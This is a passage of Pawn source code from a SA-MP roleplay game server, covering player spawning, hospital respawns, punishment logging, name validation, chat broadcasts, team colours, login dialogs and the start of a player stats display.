					Team2Total;

				foreach(Player, i) {
					if(GetPVarInt(i, "PBM") == GetPVarInt(playerid, "PBM")) {
						if(PaintballTeam[i] == 1) Team1Total ++;
						else if(PaintballTeam[i] == 2) Team2Total ++;
					}
				}

				if(Team1Total == Team2Total) {}// happy days.
				else if(Team1Total > Team2Total) PaintballTeam[playerid] = 2;
				else PaintballTeam[playerid] = 1;

				switch(PaintballTeam[playerid]) {
					case 1:	SetPlayerColor(playerid, 0xFFFF0000);
					case 2: SetPlayerColor(playerid, 0x33CCFF00);
				}
			}
			switch(GetPVarInt(playerid, "PBM")) {
			    case 1: { // dm lv warehouse
					SetPlayerPos(playerid, 1059.895996, 2081.685791, 10.820312);
					SetPlayerInterior(playerid, 0); // just for clarity
					SetPlayerVirtualWorld(playerid, 60);
				}
			    case 2: { // dm random warehouse
					SetPlayerPos(playerid, 1283.287841, 5.694778, 1001.011779);
					SetPlayerInterior(playerid, 18);
					SetPlayerVirtualWorld(playerid, 61);
			    }
			    case 3: { // dm rc battlefield
					SetPlayerPos(playerid, -975.975708, 1060.983032, 1345.671875);
					SetPlayerInterior(playerid, 10);
					SetPlayerVirtualWorld(playerid, 62);
				}
			    case 4: { // tdm lv warehouse
					SetPlayerInterior(playerid, 0);
					SetPlayerVirtualWorld(playerid, 63);
					if(PaintballTeam[playerid] == 1) {
						SetPlayerPos(playerid, 1068.6324, 2082.7930, 10.8203);
						SetPlayerFacingAngle(playerid, 359.9999);
						SetPlayerTeam(playerid, 1);
					} else {
						SetPlayerPos(playerid, 1069.3499, 2127.0828, 10.8203);
						SetPlayerFacingAngle(playerid, 181.4610);
						SetPlayerTeam(playerid, 2);
					}
				}
			    case 5: { // tdm random warehouse
					SetPlayerInterior(playerid, 18);
					SetPlayerVirtualWorld(playerid, 64);
					if(PaintballTeam[playerid] == 1) {
						SetPlayerPos(playerid, 1305.5143, 3.6555, 1001.0269);
						SetPlayerFacingAngle(playerid, 0);
						SetPlayerTeam(playerid, 1);
					} else {
						SetPlayerPos(playerid, 1252.7601,-46.6263,1001.0282);
						SetPlayerFacingAngle(playerid, 133.2679);
						SetPlayerTeam(playerid, 2);
					}
			    }
			    case 6: { // tdm rc battlefield
					SetPlayerInterior(playerid, 10);
					SetPlayerVirtualWorld(playerid, 65);
					if(PaintballTeam[playerid] == 1) {
						SetPlayerPos(playerid, -1128.8225, 1057.4939, 1346.4141);
						SetPlayerFacingAngle(playerid, 260);
						SetPlayerTeam(playerid, 1);
					} else {
						SetPlayerPos(playerid, -976.2924, 1061.0496, 1345.6719);
						SetPlayerFacingAngle(playerid, 90);
						SetPlayerTeam(playerid, 2);
					}
				}
			}

			return 1;
		}

		if(GetPVarInt(playerid, "EventToken") == 1) {
		    DeletePVar(playerid, "EventToken");
			DeletePVar(playerid, "EventAnims");
		    SetPlayerWeapons(playerid);
		    SetPlayerPos(playerid,EventFloats[playerid][1],EventFloats[playerid][2],EventFloats[playerid][3]);
			SetPlayerVirtualWorld(playerid, EventLastVW[playerid]);
			SetPlayerFacingAngle(playerid, EventFloats[playerid][0]);
			if(EventLastInt[playerid] > 0 || EventLastVW[playerid] > 0) {
				LoadObjectsForPlayer(playerid);
			}
			SetPlayerInterior(playerid,EventLastInt[playerid]);
			SetPlayerHealth(playerid, EventFloats[playerid][4]);
			SetPlayerArmourEx(playerid, EventFloats[playerid][5]);
			for(new i = 0; i < 6; i++)
			{
			    EventFloats[playerid][i] = 0.0;
			}
			EventLastVW[playerid] = 0;
			EventLastInt[playerid] = 0;
			return 1;
		}
		for(new i; i < sizeof(EventInfo[EventStaff]); i++)
		{
		    if(EventInfo[EventStaff][i] == playerid)
		    {
		        SetPlayerWeapons(playerid);
			    SetPlayerPos(playerid,EventFloats[playerid][1],EventFloats[playerid][2],EventFloats[playerid][3]);
				//PlayerInfo[playerid][pInterior] = PlayerInfo[playerid][pInt];
				SetPlayerVirtualWorld(playerid, EventLastVW[playerid]);
				SetPlayerFacingAngle(playerid, EventFloats[playerid][0]);
				if(EventLastInt[playerid] > 0 || EventLastVW[playerid] > 0) {
					LoadObjectsForPlayer(playerid);
				}
				SetPlayerInterior(playerid,EventLastInt[playerid]);
				SetPlayerHealth(playerid, EventFloats[playerid][4]);
				SetPlayerArmourEx(playerid, EventFloats[playerid][5]);
				for(new d = 0; d < 6; d++)
				{
				    EventFloats[playerid][d] = 0.0;
				}
				EventLastInt[playerid] = 0;
				EventLastVW[playerid] = 0;
				EventInfo[EventStaff][i] = 999;
		    }
		}

		if(GetPVarInt(playerid, "MedicBill") == 1 && PlayerInfo[playerid][pJailed] == 0 && AdminDuty[playerid] == 0) {
			SendClientMessage(playerid, TEAM_CYAN_COLOR, "Before you're discharged, hospital staff will confiscate your weapons.");
			PlayerInfo[playerid][pDuty] = 0;
			PlayerInfo[playerid][pVW] = 0;
			PlayerInfo[playerid][pInt] = 0;
			SetPlayerVirtualWorld(playerid, 0);
			ResetPlayerWeapons(playerid);

			if(GetPVarInt(playerid, "EventToken") != 1)
				ResetPlayerWeaponsEx(playerid);

			SetPVarInt(playerid, "MedicBill", 1);
			SetPlayerInterior(playerid, 0);
			new string[70+MAX_PLAYER_NAME];
			if(PlayerInfo[playerid][pInsurance] == 1)
			{
			    if(PlayerInfo[playerid][pWantedLevel] >= 1)
				{
				    SendClientMessage(playerid, COLOR_YELLOW, " The police has been warned that you're wanted and they are on their way.");
				    format(string, sizeof(string), " All Saints Hospital has reported %s as a wanted person.", GetPlayerNameEx(playerid));
				    SendRadioMessage(1, DEPTRADIO, string);
					SendRadioMessage(2, DEPTRADIO, string);
				}
				SetPlayerCameraPos(playerid,1188.4574,-1309.2242,13.5625+6.0);
				SetPlayerCameraLookAt(playerid,1175.5581,-1324.7922,18.1610);
				SetPlayerPos(playerid, 1188.4574,-1309.2242,10.5625);
				SetPVarInt(playerid, "Hospital", 1);
			}
			else if(PlayerInfo[playerid][pInsurance] == 2)
			{
			    if(PlayerInfo[playerid][pWantedLevel] >= 1)
				{
				    SendClientMessage(playerid, COLOR_YELLOW, " The police has been warned that you're wanted and they are on their way.");
				    format(string, sizeof(string), " County General Hospital has reported %s as a wanted person.", GetPlayerNameEx(playerid));
				    SendRadioMessage(1, DEPTRADIO, string);
					SendRadioMessage(2, DEPTRADIO, string);
				}
				SetPlayerCameraPos(playerid,1999.5308,-1449.3281,13.5594+6.0);
				SetPlayerCameraLookAt(playerid,2036.2179,-1410.3223,17.1641);
				SetPlayerPos(playerid, 1999.5308,-1449.3281,10.5594);
				SetPVarInt(playerid, "Hospital", 2);
			}
			if(PlayerInfo[playerid][pInsurance] == 0)
			{
				new randhos = Random(1,3);
 				switch (randhos)
   				{
    				case 1:
  	    			{
    					if(PlayerInfo[playerid][pWantedLevel] >= 1)
						{
				    		SendClientMessage(playerid, COLOR_YELLOW, " The police has been warned that you're wanted and they are on their way.");
				    		format(string, sizeof(string), " All Saints Hospital has reported %s as a wanted person.", GetPlayerNameEx(playerid));
			    			SendRadioMessage(1, DEPTRADIO, string);
							SendRadioMessage(2, DEPTRADIO, string);
						}

						SetPlayerCameraPos(playerid,1188.4574,-1309.2242,13.5625+6.0);
						SetPlayerCameraLookAt(playerid,1175.5581,-1324.7922,18.1610);
						SetPlayerPos(playerid, 1188.4574,-1309.2242,10.5625);
						SetPVarInt(playerid, "Hospital", 1);
  	    			}
    	    		case 2:
	    	    	{
    			    	if(PlayerInfo[playerid][pWantedLevel] >= 1)
						{
				    		SendClientMessage(playerid, COLOR_YELLOW, " The police has been warned that you're wanted and they are on their way.");
				    		format(string, sizeof(string), " County General Hospital has reported %s as a wanted person.", GetPlayerNameEx(playerid));
			    			SendRadioMessage(1, DEPTRADIO, string);
							SendRadioMessage(2, DEPTRADIO, string);
						}

						SetPlayerCameraPos(playerid,1999.5308,-1449.3281,13.5594+6.0);
						SetPlayerCameraLookAt(playerid,2036.2179,-1410.3223,17.1641);
						SetPlayerPos(playerid, 1999.5308,-1449.3281,10.5594);
						SetPVarInt(playerid, "Hospital", 2);
   					}
   				}
			}
			TogglePlayerControllable(playerid, 0);
			SetPlayerHealth(playerid, 0.5);
			SetPVarInt(playerid, "HospitalTimer", 30);
			SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_HOSPITALTIMER);
			return 1;
		}
		if(AdminDuty[playerid] == 0) {
			if(GetPVarInt(playerid, "Hospital") == 0)
			{
				SetPlayerPos(playerid,PlayerInfo[playerid][pPos_x],PlayerInfo[playerid][pPos_y],PlayerInfo[playerid][pPos_z]);
				//PlayerInfo[playerid][pInterior] = PlayerInfo[playerid][pInt];
				SetPlayerVirtualWorld(playerid, PlayerInfo[playerid][pVW]);
				SetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);
				SetPlayerInterior(playerid,PlayerInfo[playerid][pInt]);
				SetPlayerHealth(playerid, PlayerInfo[playerid][pHealth]);
				SetPlayerArmourEx(playerid, PlayerInfo[playerid][pArmor]);
				SetCameraBehindPlayer(playerid);
				if(PlayerInfo[playerid][pInt] > 0)
				{
					LoadObjectsForPlayer(playerid);
				}
			}
			else
			{
				PlayerInfo[playerid][pDuty] = 0;
				PlayerInfo[playerid][pVW] = 0;
				PlayerInfo[playerid][pInt] = 0;
				SetPlayerVirtualWorld(playerid, 0);

				if(GetPVarInt(playerid, "EventToken") != 1)
					ResetPlayerWeaponsEx(playerid);

				SetPVarInt(playerid, "MedicBill", 1);
				new string[70+MAX_PLAYER_NAME];
				if(PlayerInfo[playerid][pInsurance] == 1)
				{
					if(PlayerInfo[playerid][pWantedLevel] >= 1)
					{
						SendClientMessage(playerid, COLOR_YELLOW, "The police have been informed of your current location and are on their way.");
						format(string, sizeof(string), " All Saints Hospital has reported %s as a wanted person.", GetPlayerNameEx(playerid));
						SendRadioMessage(1, DEPTRADIO, string);
						SendRadioMessage(2, DEPTRADIO, string);
					}
					SetPlayerCameraPos(playerid,1999.5308,-1449.3281,13.5594+6.0);
					SetPlayerCameraLookAt(playerid,2036.2179,-1410.3223,17.1641);
					SetPlayerPos(playerid, 1999.5308,-1449.3281,10.5594);
					SetPVarInt(playerid, "Hospital", 2);
				}
				else if(PlayerInfo[playerid][pInsurance] == 2)
				{
					if(PlayerInfo[playerid][pWantedLevel] >= 1)
					{
						SendClientMessage(playerid, COLOR_YELLOW, "The police have been informed of your current location and are on their way.");
						format(string, sizeof(string), " County General Hospital has reported %s as a wanted person.", GetPlayerNameEx(playerid));
						SendRadioMessage(1, DEPTRADIO, string);
						SendRadioMessage(2, DEPTRADIO, string);
					}
					SetPlayerCameraPos(playerid,1188.4574,-1309.2242,13.5625+6.0);
					SetPlayerCameraLookAt(playerid,1175.5581,-1324.7922,18.1610);
					SetPlayerPos(playerid, 1188.4574,-1309.2242,10.5625);
					SetPVarInt(playerid, "Hospital", 1);
				}
				if(PlayerInfo[playerid][pInsurance] == 0)
				{
					new randhos = Random(1,3);
					switch(randhos)
					{
						case 1:
						{
							if(PlayerInfo[playerid][pWantedLevel] >= 1)
							{
								SendClientMessage(playerid, COLOR_YELLOW, " The police has been warned that you're wanted and they are on their way.");
								format(string, sizeof(string), " All Saints Hospital Hospital has reported %s as a wanted person.", GetPlayerNameEx(playerid));
								SendRadioMessage(1, DEPTRADIO, string);
								SendRadioMessage(2, DEPTRADIO, string);
							}

							SetPlayerCameraPos(playerid,1188.4574,-1309.2242,13.5625+6.0);
							SetPlayerCameraLookAt(playerid,1175.5581,-1324.7922,18.1610);
							SetPlayerPos(playerid, 1188.4574,-1309.2242,10.5625); // Warp the player
							SetPVarInt(playerid, "Hospital", 2);
						}
						case 2:
						{
							if(PlayerInfo[playerid][pWantedLevel] >= 1)
							{
								SendClientMessage(playerid, COLOR_YELLOW, " The police has been warned that you're wanted and they are on their way.");
								format(string, sizeof(string), " County General Hospital has reported %s as a wanted person.", GetPlayerNameEx(playerid));
								SendRadioMessage(1, DEPTRADIO, string);
								SendRadioMessage(2, DEPTRADIO, string);
							}

							SetPlayerCameraPos(playerid,1999.5308,-1449.3281,13.5594+6.0);
							SetPlayerCameraLookAt(playerid,2036.2179,-1410.3223,17.1641);
							SetPlayerPos(playerid, 1999.5308,-1449.3281,10.5594);
							SetPVarInt(playerid, "Hospital", 1);
						}
					}
				}
				TogglePlayerControllable(playerid, 0);
				SetPlayerHealth(playerid, 0.5);
				SetPVarInt(playerid, "HospitalTimer", 30);
				SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_HOSPITALTIMER);
			}
		}
		new Float: x, Float: y, Float: z;
		GetPlayerPos(playerid, x, y, z);
		if(x == 0.0 && y == 0.0)
		{
  			SetPlayerInterior(playerid,0);
			SetPlayerPos(playerid, 1714.90, -1904.12, 13.57);
			SetPlayerFacingAngle(playerid, 329.64);
			SetCameraBehindPlayer(playerid);
		}
		SetPlayerToTeamColor(playerid);
		return 1;
	}
	return 1;
}

/*stock ConnectionLog(playerid, accountid, username[]) {
	new
	    szName[64],
	    szQuery[300];

	mysql_escape_string(username, szName,sqldb);

	format(szQuery, sizeof(szQuery), "INSERT INTO connections (PlayerID, AccountID, Username, TimeLoggedIn) VALUES(%d, %d, '%s', UNIX_TIMESTAMP(now()))", playerid, accountid, szName);
	mysql_tquery(szQuery, THREAD_NO_RESULT, 0,sqldb);
	return 1;
}*/

stock punishmentLog(playerid, issuerid, puntype, szPunishment[128], szReason[]) {
	if(AdminDuty[playerid] == 0) {
		new
			szPunText[128],
			szRawReason[128],
			szQuery[440];

		mysql_escape_string(szPunishment, szPunText,128,sqldb);
		mysql_escape_string(szReason, szRawReason,128,sqldb);

		mysql_format(sqldb,szQuery, sizeof(szQuery), "INSERT INTO punishments (punIssuer, punIssuedTo, punText, punType, punReason, punTS) VALUES(%d, %d, '%s', %d, '%s', UNIX_TIMESTAMP(now()))", PlayerInfo[issuerid][pID], PlayerInfo[playerid][pID], szPunText, puntype, szRawReason);
		mysql_tquery(sqldb,szQuery);
	}
	return 1;
}

stock punishmentLogEx(playerid, issuerid, puntype, szPunishment[128], szReason[]) {
	if(AdminDuty[playerid] == 0) {
		new
	    szPunText[128],
	    szRawReason[128],
	    szQuery[440];

		mysql_escape_string(szPunishment, szPunText,sqldb);
		mysql_escape_string(szReason, szRawReason,sqldb);

		mysql_format(sqldb,szQuery, sizeof(szQuery), "INSERT INTO punishments (punIssuer, punIssuedTo, punText, punType, punReason, punTS) VALUES(%d, %d, '%s', %d, '%s', UNIX_TIMESTAMP(now()))", issuerid, playerid, szPunText, puntype, szRawReason);
		mysql_tquery(sqldb,szQuery);
	}
	return 1;
}

stock Log(sz_fileName[], sz_input[]) {

	new
		sz_logEntry[156],
		i_dateTime[2][3],
		File: fileHandle = fopen(sz_fileName, io_append);

	gettime(i_dateTime[0][0], i_dateTime[0][1], i_dateTime[0][2]);
	getdate(i_dateTime[1][0], i_dateTime[1][1], i_dateTime[1][2]);

	format(sz_logEntry, sizeof(sz_logEntry), "[%i/%i/%i - %i:%i:%i] %s\r\n", i_dateTime[1][0], i_dateTime[1][1], i_dateTime[1][2], i_dateTime[0][0], i_dateTime[0][1], i_dateTime[0][2], sz_input);
	fwrite(fileHandle, sz_logEntry);
	return fclose(fileHandle);
}

IsNumeric(const string[])
{
	for (new i = 0, j = strlen(string); i < j; i++)
	{
		if(string[i] > '9' || string[i] < '0') return 0;
	}
	return 1;
}

ReturnUser(text[]) {

	new
		strPos,
		returnID = 0,
		bool: isnum = true;

	while(text[strPos]) {
		if(isnum) {
			if('0' <= text[strPos] <= '9') returnID = (returnID * 10) + (text[strPos] - '0');
			else isnum = false;
		}
		strPos++;
	}
	if(isnum) {
		if(IsPlayerConnected(returnID)) return returnID;
	}
	else {

		new
			sz_playerName[MAX_PLAYER_NAME];

		foreach(Player, i) {
			GetPlayerName(i, sz_playerName, MAX_PLAYER_NAME);
			if(!strcmp(sz_playerName, text, true, strPos)) return i;
		}
	}
	return INVALID_PLAYER_ID;
}

stock InvalidNameCheck(playerid)
{

	new
		szPlayerName[MAX_PLAYER_NAME],
		arrForbiddenNames[][] = {
			"com1", "com2", "com3", "com4",
			"com5", "com6", "com7", "com8",
			"com9", "lpt4", "lpt5", "lpt6",
			"lpt7", "lpt8", "lpt9", "nul",
			"clock$", "aux", "prn", "con",
			"InvalidNick", "BannedPlayer"
		},
		iLength,
		i;

	GetPlayerName(playerid, szPlayerName, sizeof(szPlayerName));
	iLength = strlen(szPlayerName);

	while(i < sizeof(arrForbiddenNames)) if(strcmp(arrForbiddenNames[i++], szPlayerName, true) == 0) {
		SetPlayerName(playerid, "InvalidNick");
		SendClientMessage(playerid, COLOR_NEWS, "You have been kicked for using an invalid name.");
		Kick(playerid);
		return 0;
	}

	if(szPlayerName[iLength - 1] == '_' || szPlayerName[0] == '_' || strfind(szPlayerName, "_", false) == -1)
	{
		SendClientMessage(playerid, COLOR_NEWS, "You have been kicked for failing to connect with a role play name (i.e. John_Smith).");
  		SetPlayerName(playerid, "InvalidNick");
		Kick(playerid);
		return 0;
	}
	return 1;
}

stock SendBugMessage(member, color, string[])
{
	foreach(Player, i)
	{
 		if(PlayerInfo[i][pFaction] == member && gBug[i] == 1)
		{
			SendClientMessage(i, color, string);
		}
	}
}

stock SendRadioMessage(member, color, string[])
{
	foreach(Player, i) {
		if(PlayerInfo[i][pFaction] == member) {
			SendClientMessage(i, color, string);
		}
	}
}

stock SendFamilyMessage(family, color, string[])
{
	foreach(Player, i) {
		if(PlayerInfo[i][pFaction] == family || PlayerInfo[i][pLeader] == family) {
			if(!gFam[i]) {
				SendClientMessage(i, color, string);
			}
		}
	}
}

stock RadioBroadCast(playerid, string[])
{
	new MiscString[128], Float: aaaPositions[3];
	foreach(Player, i)
	{
		if(PlayerInfo[i][pRadioFreq] == PlayerInfo[playerid][pRadioFreq] && PlayerInfo[i][pRadio] >= 1 && gRadio[i] != 0)
		{
			GetPlayerPos(i, aaaPositions[0], aaaPositions[1], aaaPositions[2]);
			format(MiscString, sizeof(MiscString), "** Radio (%d kHz) ** %s: %s", PlayerInfo[playerid][pRadioFreq], GetPlayerNameEx(playerid), string);
			SendClientMessage(i, PUBLICRADIO_COLOR, MiscString);
			format(MiscString, sizeof(MiscString), "(radio) %s", string);
			SetPlayerChatBubble(playerid,MiscString,COLOR_WHITE,15.0,5000);
		}
	}
}

stock SendJobMessage(job, color, string[])
{
	foreach(Player, i) {
		if((PlayerInfo[i][pJob] == job || PlayerInfo[i][pJob2] == job) && JobDuty[i] == 1) {
			SendClientMessage(i, color, string);
		}
	}
}

stock SendTaxiMessage(color, string[])
{
	foreach(Player, i) {
		if(TransportDuty[i] == 1 && (PlayerInfo[i][pJob] == 17 || PlayerInfo[i][pJob2] == 17))
		{
 			SendClientMessage(i, color, string);
		}
	}
}

stock SendBusMessage(color, string[])
{
	foreach(Player, i) {
		if(TransportDuty[i] == 2 && (PlayerInfo[i][pJob] == 17 || PlayerInfo[i][pJob2] == 17))
		{
 			SendClientMessage(i, color, string);
		}
	}
}

stock SendNewFamilyMessage(family, color, string[])
{
	foreach(Player, i) {
		if(PlayerInfo[i][pGang] == family) {
			if(!gFam[i]) {
				SendClientMessage(i, color, string);
			}
		}
	}
}

stock SetPlayerArmourEx(playerid, Float:armour)
{
	ValidArmor[playerid] = armour;
	SetPlayerArmour(playerid, ValidArmor[playerid]);
	return 1;
}

stock IsBETAServer() {
	if(GetServerVarAsInt("port") == 7777)
	    return 0;

	return 1;
}

stock SendClientMessageEx(playerid, color, string[])
{
	if(InsideMainMenu[playerid] == 1 || InsideTut[playerid] == 1 || ActiveChatbox[playerid] == 0)
		return 0;

	else SendClientMessage(playerid, color, string);
	return 1;
}

stock ICNews(color, string[]) {
	foreach(Player, i) {
	    if(gNews[i] == 0)
	        SendClientMessageEx(i, color, string);
	}

	return 1;
}

stock SendClientMessageToAllEx(color, string[])
{
	foreach(Player, i) {
		if(InsideMainMenu[i] == 1 || InsideTut[i] == 1 || ActiveChatbox[i] == 0) {}
		else SendClientMessage(i, color, string);
	}
	return 1;
}

stock ShowMainMenuGUI(playerid) {
	InsideMainMenu[playerid] = 1;
	new string[22];

 	format(string, sizeof(string), "Players online: %d", Iter_Count(Player));
  	TextDrawSetString(MainMenuTxtdraw[7], string);

	for(new i = 0; i < 12; i++) {
		TextDrawShowForPlayer(playerid, MainMenuTxtdraw[i]);
	}

	return 1;
}

stock HideMainMenuGUI(playerid) {
	InsideMainMenu[playerid] = 0;
	ActiveChatbox[playerid] = 1;

	for(new i = 0; i < 12; i++) {
		TextDrawHideForPlayer(playerid, MainMenuTxtdraw[i]);
	}

	return 1;
}

stock ShowMainMenuDialog(playerid, frame) {
	new
		string[180];

	switch(frame) {
		case 1: {
			format(string, sizeof(string), "{FFFFFF}That username is registered, please enter your password below.\n\n{FFA500}Username: {FFFFFF}%s\n\n{FFA500}Password:", GetPlayerNameEx(playerid));
			ShowPlayerDialogEx(playerid,MAINMENU,DIALOG_STYLE_PASSWORD,"{FFA500}Next Generation Roleplay - Login",string,"Login","Quit");
		}
		case 2: {
			format(string, sizeof(string), "{FFFFFF}You may register this username by entering your desired password below.\n\n{FFA500}Username: {FFFFFF}%s\n\n{FFA500}Choose a Password:", GetPlayerNameEx(playerid));
			ShowPlayerDialogEx(playerid,MAINMENU2,DIALOG_STYLE_PASSWORD,"{FFA500}Next Generation Roleplay - Registration",string,"Register","Quit");
		}
		case 3: {
			format(string, sizeof(string), "{FFFFFF}Wrong password.\n\n{FFFFFF}That username is registered, please enter your password below.\n\n{FFA500}Username: {FFFFFF}%s\n\n{FFA500}Password:", GetPlayerNameEx(playerid));
			ShowPlayerDialogEx(playerid,MAINMENU,DIALOG_STYLE_PASSWORD,"{FFA500}Next Generation Roleplay - Login",string,"Login","Quit");
		}
	}

	return 1;
}

forward BackupClear(playerid, calledbytimer);
public BackupClear(playerid, calledbytimer)
{
	if(IsACop(playerid) || PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pFaction] == 5) {
		if(Backup[playerid] == 1) {
			foreach(Player, i) {
				if(IsACop(i) || PlayerInfo[i][pFaction] == 3 || PlayerInfo[i][pFaction] == 5) {
					SetPlayerMarkerForPlayer(i, playerid, TEAM_HIT_COLOR);
				}
			}
			SetPlayerToTeamColor(playerid);
			if(calledbytimer != 1) {
				SendClientMessage(playerid, COLOR_GRAD2, "Your backup request has been cleared.");
			} else {
				SendClientMessage(playerid, COLOR_GRAD2, "Your backup request has been cleared automatically.");
			}
			Backup[playerid] = 0;
		} else {
			if(calledbytimer != 1) {
				SendClientMessage(playerid, COLOR_GRAD2, "You don't have an active backup request!");
			}
		}
	}
	return 1;
}

forward ClearDrugs(playerid);
public ClearDrugs(playerid)
{
	UsedWeed[playerid] = 0;
	UsedCrack[playerid] = 0;
	return 1;
}

stock HelperBroadcast(color, string[], level) {
	foreach(Player, i) {
		if(PlayerInfo[i][pHelper] >= level && GetPVarInt(i, "cschat") == 0) {
			SendClientMessage(i, color, string);
		}
	}
	return 1;
}

stock ABroadCast(color,string[],level)
{
	foreach(Player, i)
	{
		if(PlayerInfo[i][pAdmin] >= level)
		{
			SendClientMessage(i, color, string);
			//printf("%s", string);
		}
	}
	return 1;
}

stock ExecuteNOPAction(playerid)
{
	new string[128];
	new newcar = GetPlayerVehicleID(playerid);
	if(NOPTrigger[playerid] >= MAX_NOP_WARNINGS) { return 1; }
	NOPTrigger[playerid]++;
	RemovePlayerFromVehicle(playerid);
	new Float:X, Float:Y, Float:Z;
	GetPlayerPos(playerid, X, Y, Z);
	SetPlayerPos(playerid, X, Y, Z+2);
	NOPCheck(playerid);
	if(NOPTrigger[playerid] > 1)
	{
		new sec = (NOPTrigger[playerid] * 5000)/1000-1;
		format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s (ID %d) may be NOP hacking - restricted vehicle (model %d) for %d seconds.", GetPlayerNameEx(playerid), playerid, GetVehicleModel(newcar),sec);
		ABroadCast(COLOR_YELLOW, string, 2);
	}
	return 1;
}

stock SetPlayerToTeamColor(playerid) {
	if(GetPVarInt(playerid, "PBM") > 3) {
		switch(PaintballTeam[playerid]) {
			case 1:	SetPlayerColor(playerid, 0xFFFF0000);
			case 2: SetPlayerColor(playerid, 0x33CCFF00);
		}
		return 1;
	}

	if((PlayerInfo[playerid][pJob] == 17 || PlayerInfo[playerid][pJob2] == 17) && TransportDuty[playerid] != 0)
	{
		SetPlayerColor(playerid,TEAM_TAXI_COLOR);
	}
	else
	{
	    SetPlayerColor(playerid,TEAM_HIT_COLOR);
	}

	if(PlayerInfo[playerid][pWantedLevel] > 5)
 	{
		SetPlayerColor(playerid,WANTED_COLOR);
	}

	if(PlayerInfo[playerid][pJailed] == 3)
	{
		SetPlayerColor(playerid,TEAM_APRISON_COLOR);
		return 1;
	}
 	else if(PlayerInfo[playerid][pJailed] == 4)
 	{
		SetPlayerColor(playerid,TEAM_ORANGE_COLOR);
		return 1;
	}
	else
	{
 		SetPlayerColor(playerid,TEAM_HIT_COLOR);
	}

 	if(IsACop(playerid))
 	{
  		if(PlayerInfo[playerid][pDuty] == 1)
    	{
     		if(PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pLeader] == 1)
       		{
       			SetPlayerColor(playerid,TEAM_BLUE_COLOR);
			}
			else if(PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2)
   			{
    			SetPlayerColor(playerid,TEAM_FBI_COLOR);
			}
			else
			{
   				SetPlayerColor(playerid,TEAM_HIT_COLOR); // white
			}
		}
		else
		{
  			SetPlayerColor(playerid,TEAM_HIT_COLOR); // white
		}
	}
	else
	{
		if((PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pLeader] == 3) && PlayerInfo[playerid][pDuty] == 1) {
			SetPlayerColor(playerid, TEAM_MED_COLOR);
		}
	    else if((PlayerInfo[playerid][pFaction] == 9 || PlayerInfo[playerid][pLeader] == 9) && PlayerInfo[playerid][pDuty] == 1) {
    		SetPlayerColor(playerid,TEAM_NEWS_COLOR);
		}
		else SetPlayerColor(playerid,TEAM_HIT_COLOR); // white
	}
	return 1;
}

stock ShowStats(playerid,targetid)
{
	if(IsPlayerConnected(targetid))
	{
	    new facgang[20], employer[64], rank[64], division[64], jtext[20], jtext2[20];

	    new level = PlayerInfo[targetid][pLevel];
	    new phours = PlayerInfo[targetid][pConnectTime];
		new respect = PlayerInfo[targetid][pRespect];
		new nxtlevel = PlayerInfo[targetid][pLevel]+1;
		new expamount = nxtlevel*levelexp;
		new costlevel = nxtlevel*2500;
		new pnumber = PlayerInfo[targetid][pNumber];
		new warns = PlayerInfo[targetid][pWarns];

		facgang = "Faction";
		employer = "None";
		rank = "None";
		if(PlayerInfo[targetid][pGang] < 255)
		{
		    facgang = "Family"; division = "None";
			format(employer, sizeof(employer), "%s", FamilyInfo[PlayerInfo[targetid][pGang]][FamilyName]);
			switch(PlayerInfo[targetid][pRank])
			{
				case 1: format(rank, sizeof(rank), "%s", FamilyInfo[PlayerInfo[targetid][pGang]][FamilyRank1]);
				case 2: format(rank, sizeof(rank), "%s", FamilyInfo[PlayerInfo[targetid][pGang]][FamilyRank2]);
				case 3: format(rank, sizeof(rank), "%s", FamilyInfo[PlayerInfo[targetid][pGang]][FamilyRank3]);
				case 4: format(rank, sizeof(rank), "%s", FamilyInfo[PlayerInfo[targetid][pGang]][FamilyRank4]);
				case 5: format(rank, sizeof(rank), "%s", FamilyInfo[PlayerInfo[targetid][pGang]][FamilyRank5]);
	  			case 6: format(rank, sizeof(rank), "%s", FamilyInfo[PlayerInfo[targetid][pGang]][FamilyRank6]);
				default: format(rank, sizeof(rank), "%s", FamilyInfo[PlayerInfo[targetid][pGang]][FamilyRank1]);
			}
		}
		else GetPlayerFactionInfo(targetid, rank, division, employer);

		switch(PlayerInfo[targetid][pJob])
		{
			case 1: jtext = "Detective";
			case 2: jtext = "Lawyer";
			case 3: jtext = "Whore";
			case 4: jtext = "Drugs Dealer";
			case 5: jtext = "Car Jacker";
			//case 6: jtext = "News Reporter";
			case 7: jtext = "Car Mechanic";
			case 8: jtext = "Bodyguard";
			case 9: jtext = "Arms Dealer";
			//case 10: jtext = "Car Dealer";
			case 12: jtext = "Boxer";
			case 14: jtext = "Drug Smuggler";
			//case 15: jtext = "Paper Boy";
			//case 16: jtext = "Trucker";
			case 17: jtext = "Taxi Driver";
			case 18: jtext = "Craftsman";
			case 19: jtext = "Bartender";
			case 20: jtext = "Trucker";
			case 21: jtext = "Pizza Boy";
			default: jtext = "None";
		}
		switch(PlayerInfo[targetid][pJob2])
		{
			case 1: jtext2 = "Detective";
			case 2: jtext2 = "Lawyer";
			case 3: jtext2 = "Whore";
			case 4: jtext2 = "Drugs Dealer";
			case 5: jtext2 = "Car Jacker";
			//case 6: jtext2 = "News Reporter";
			case 7: jtext2 = "Car Mechanic";
			case 8: jtext2 = "Bodyguard";
			case 9: jtext2 = "Arms Dealer";
			//case 10: jtext2 = "Car Dealer";
			case 12: jtext2 = "Boxer";
			case 14: jtext2 = "Drug Smuggler";
			//case 15: jtext2 = "Paper Boy";
			//case 16: jtext2 = "Trucker";
			case 17: jtext2 = "Taxi Driver";
			case 18: jtext2 = "Craftsman";
			case 19: jtext2 = "Bartender";
			case 20: jtext2 = "Trucker";
			case 21: jtext2 = "Pizza Boy";
			default: jtext2 = "None";
		}
		new jlevel;
		switch(PlayerInfo[targetid][pJob])
		{
			case 1:
			{
					new skilllevel = PlayerInfo[targetid][pDetSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
